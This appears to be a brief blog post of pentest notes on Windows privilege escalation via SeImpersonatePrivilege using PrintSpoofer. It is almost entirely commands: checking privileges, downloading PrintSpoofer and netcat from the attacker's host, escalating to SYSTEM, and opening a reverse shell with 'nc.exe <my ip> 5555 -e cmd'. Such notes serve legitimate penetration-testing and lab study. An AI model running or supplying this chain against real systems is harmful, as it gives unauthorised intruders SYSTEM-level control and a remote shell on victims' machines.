---
layout: post
title:  "privesc - windows -  seimpersonateprivilege / seassignprimarytokenprivilege - printspoofer"
date:   2022-01-01
categories: windows
---

## SeImpersonatePrivilege

```bash

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 

```


```bash
Invoke-WebRequest -Uri "http://<my ip>/PrintSpoofer64.exe" -OutFile PrintSpoofer.exe

.\PrintSpoofer.exe -i -c whoami

Invoke-WebRequest -Uri "http://<my ip>/netcat/nc64.exe" -OutFile nc.exe

.\PrintSpoofer.exe -i -c 'nc.exe <my ip> 5555 -e cmd'
```

